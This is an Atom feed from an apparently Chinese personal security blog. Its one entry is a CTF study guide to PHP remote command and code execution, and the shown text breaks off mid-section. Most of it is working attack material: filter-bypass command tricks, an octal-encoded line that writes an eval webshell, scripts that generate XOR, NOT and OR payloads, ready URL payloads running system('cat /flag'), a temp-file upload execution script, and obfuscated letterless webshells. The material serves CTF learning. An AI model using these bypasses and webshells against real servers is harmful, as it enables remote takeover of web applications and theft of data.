<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2022-11-22T12:47:08.384Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>rce考点总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-21T07:17:20.000Z</published>
    <updated>2022-11-22T12:47:08.384Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近准备把所学的漏洞全部仔细的整理一遍，一、是为了让自己对这些知识点有些全面系统的认识 二、是写题的时候可以直接翻博客不需要再去找那么多的文章，此外也希望对以后社团的学弟学妹有些帮助，这些文章的内容只有一部分为我自己写的，很多是搬运师傅的文章，因为很多师傅的文章写的已经十分完美，特别是p神，很多年前发表的东西现在仍不过时。我所做的主要是把文章整合在一起，对漏洞的考点有更加全面的认识！</p><h1 id="什么是rce"><a href="#什么是rce" class="headerlink" title="什么是rce"></a>什么是rce</h1><p>什么是rce?</p><p>既远程代码/命令执行，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</p><p>命令执行：直接执行我们输入的恶意命令</p><p>代码执行：直接执行我们所输入的恶意代码</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。</p><p><strong>定义：</strong>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><p><strong>永远不要相信用户的输入！</strong></p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p> 继承Web服务程序的权限去执行系统命令或读写文件<br> 反弹shell<br> 控制整个网站甚至控制服务器<br> 进一步内网渗透</p><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><pre><code>system()  输出并返回最后一行shell结果exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面shell_exec()  通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上（替换system）</code></pre><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><pre><code>eval()函数:用来执行一个字符串表达式，并返回表达式的值assert()函数:在php语言中是用来判断一个表达式是否成立,返回true or false,但是字符串参数会被执行</code></pre><h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>我们需要注意，当我们正常输入的时候，在大多数情况下是不会触发这一漏洞的，我们需要一些小tips。</p><p>常见技巧：</p><pre><code class="php">一、常见管道符：‘|’ 直接执行后面的语句‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句‘&amp;’ 前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令Linux:Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同</code></pre><pre><code class="php">二、空格绕过(空格被过滤)：&lt;  --  重定向，如cat&lt;flag.php&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php%09  --  需要php环境，如cat%09flag.php$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php$IFS$9  --  后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</code></pre><pre><code class="php">三、黑名单绕过1、拼接a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;2、base64编码echo MTIzCg==|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flagecho &quot;Y2F0IC9mbGFn&quot;|base64 -d|sh ==&gt;cat /flag3、hex编码echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag4、单引号、双引号,反单引号绕过ca&#39;&#39;t flag 或ca&quot;&quot;t flagca&#39;&#39;t te&quot;&quot;st.phpc``a``t /etc/passwd5、反斜杠绕过ca\t fl\agcat te\st.php6、绕过ip中的句点网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP7、利用oct编码（八进制）绕过$(printf &quot;\154\163&quot;)  //ls命令$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php在线转换网站:https://photo333.com/text-to-octal-zh.php8、&#39;/&#39;被过滤绕过可利用&#39;;&#39;拼接命令绕过cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd (也可以利用第七步的八进制绕过)9、通配符绕过列如cat /passwd：??? /e??/?a????cat /e*/pa*10、利用未初始化变量$u绕过cat$u /etc/passwdcat /etc$u/passwd11、glob通配符cat t[a-z]stcat t&#123;a,b,c,d,e,f&#125;st12、利用PATH绕过可以通过截断和拼接来得到我们想要的来getshell$&#123;PATH:5:1&#125; //l$&#123;PATH:2:1&#125; //s$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //拼接后是ls,执行命令$&#123;PATH:5:1&#125;s //拼接后是ls,执行命令</code></pre><pre><code class="php">四、绕过长度限制1，通过&gt;来创建文件&gt;flag.txt2，通过&gt;将命令结果存入文件中echo &quot;hello hacker&quot; &gt; flag.txt3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容echo &quot;hello hacker&quot; &gt;&gt; flag.txt4、Linux中命令换行在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。比如：cat flagca\t\ fla\g.txt将命令一条一条输入一个文本中再执行:root@kali:~# echo &quot;ca\\&quot;&gt;cmdroot@kali:~# echo &quot;t\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot;ag&quot;&gt;&gt;cmdroot@kali:~# cat cmdca\t\ fl\agroot@kali:~# sh cmdthis is your flag</code></pre><pre><code class="php">五、各种读文件命令cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat -n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</code></pre><p>上面介绍的这些方法可以解决大部分ctf题目，但是我们会经常遇到更加严苛的过滤，我们就要介绍接下来的一些题目类型和解决方法</p><h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>我们以一道经典的题目为例:</p><p>[极客大挑战 2019]RCE ME</p><p>题目代码:</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>php7</p><p>脚本:</p><pre><code class="php">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#39;[+]your function: &#39;);$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#39;[+]your command: &#39;);$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;</code></pre><p>脚本使用的时候注意有些()不可以一起转进去，我们先来测试一下</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200544538.png" alt="image-20221121200544538"></p><pre><code class="php">http://127.0.0.1/index.php?code=(~%8f%97%8f%96%91%99%90)(); //我们不需要参数只是测试，把后面的取反符号去掉即可</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121191347692.png" alt="image-20221121191347692"></p><p>我们现在来构造可以执行命令的字符串</p><pre><code class="php">http://480abdfe-af61-4f9a-bfdf-2e0227fda03b.node4.buuoj.cn:81/?code=(~%8c%86%8c%8b%9a%92)(~%93%8c); //system(&#39;ls&#39;)</code></pre><p>按理说没问题的哦，我本地是可以的，不过在buu没有执行成功，不过问题不大，还有很多种方法</p><p>这题可以通过:</p><pre><code class="php">assert(eval($_POST[sakura]))</code></pre><p>还是利用取反构造</p><pre><code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%9E%94%8A%8D%9E%A2%D6);</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200843416.png" alt="image-20221121200843416"></p><p>这里尝试执行命令，同样没反应，那么这题应该是没有回显的，但是我们可以使用蚁剑去连接!</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121194931677.png" alt="image-20221121194931677"></p><p>这题到这里并没有结束，不过后面并不是我们需要关注的重点，我们就先忽略吧！</p><h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><p>php7</p><p>由于buu的题目无回显，我们直接把源码搭建在本地进行测试:</p><p>给出两个脚本:</p><p>yihuo.php</p><pre><code class="php">&lt;?php/*author yu22x*/$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[a-z0-9]/i&#39;; //根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)^urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>yihuo.py</p><pre><code class="python"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br> 接着运行python脚本即可。<br> 运行结果</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201209130.png" alt="image-20221121201209130"></p><pre><code>(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();  //phpinfo()(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;); //system(whoami)(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);  //system(ls)(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;); //system(cat /flag)</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201250221.png" alt="image-20221121201250221"></p><h2 id="二进制或绕过"><a href="#二进制或绕过" class="headerlink" title="二进制或绕过"></a>二进制或绕过</h2><p>php7</p><p>原理是一样的，只需要在上面的脚本上稍加改动即可</p><p>or.php</p><pre><code class="php">&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[0-9a-z]/i&#39;;//根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)|urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>or.py</p><pre><code class="python"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121203834452.png" alt="image-20221121203834452"></p><pre><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();  //phpinfo()(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);  //system(whoami)(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);   //system(ls)(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%0c%01%07&quot;|&quot;%60%60%60%20%2f%60%60%60%60&quot;); //cat /flag</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121204056924.png" alt="image-20221121204056924"></p><h2 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h2><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png" alt="image.png"></a></p><p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="image.png"></a></p><p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><p><strong>深入理解glob通配符</strong></p><p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读Linux的文档（ <a href="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p><p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png" alt="image.png"></a></p><p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png" alt="image.png"></a></p><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，我发现另一个有趣的用法：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png" alt="image.png"></a></p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png" alt="image.png"></a></p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="image.png"></a></p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png" alt="image.png"></a></p><p>显然这一招是管用的。</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=</code>. /???/????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121212607216.png" alt="image-20221121212607216"></p><p>可写一个脚本:</p><pre><code class="python">#coding:utf-8#author yu22ximport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#39;file&#39;:&#39;cat f*&#39;&#125;response=requests.post(url,files=files)html = response.textprint(html)</code></pre><h2 id="构造无数字字母webshell"><a href="#构造无数字字母webshell" class="headerlink" title="构造无数字字母webshell"></a>构造无数字字母webshell</h2><p>环境:php5</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境</p><h3 id="异或webshell"><a href="#异或webshell" class="headerlink" title="异或webshell"></a>异或webshell</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p><pre><code class="php">&lt;?php$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=&#39;assert&#39;;$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=&#39;_POST&#39;;$___=$$__;$_($___[_]); // assert($_POST[_]);</code></pre><p>传入代码:</p><pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);</code></pre><p>执行结果如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214114436.png" alt="image-20221121214114436"></p><h3 id="取反webshell"><a href="#取反webshell" class="headerlink" title="取反webshell"></a>取反webshell</h3><p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214447649.png" alt="image-20221121214447649"></p><p>可构造出webshell</p><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</code></pre><p>直接传入:</p><pre><code class="php">$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</code></pre><p>使用时候进行下url编码</p><pre><code class="php">%24__%3d(&#39;%3e&#39;%3e&#39;%3c&#39;)%2b(&#39;%3e&#39;%3e&#39;%3c&#39;)%3b%24_%3d%24__%2f%24__%3b%24____%3d&#39;&#39;%3b%24___%3d%22%e7%9e%b0%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9a%84%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%8d%8a%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%a7%8b%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24_____%3d&#39;_&#39;%3b%24___%3d%22%e4%bf%af%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9e%b0%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e6%ac%a1%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e7%ab%99%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24_%3d%24%24_____%3b%24____(%24_%5b%24__%5d)%3b</code></pre><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121220150735.png" alt="image-20221121220150735"></p><h3 id="自增webshell"><a href="#自增webshell" class="headerlink" title="自增webshell"></a>自增webshell</h3><p>7.0.12以上版本不可使用</p><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></a></p><p>也就是说，<code>&#39;a&#39;++ =&gt; 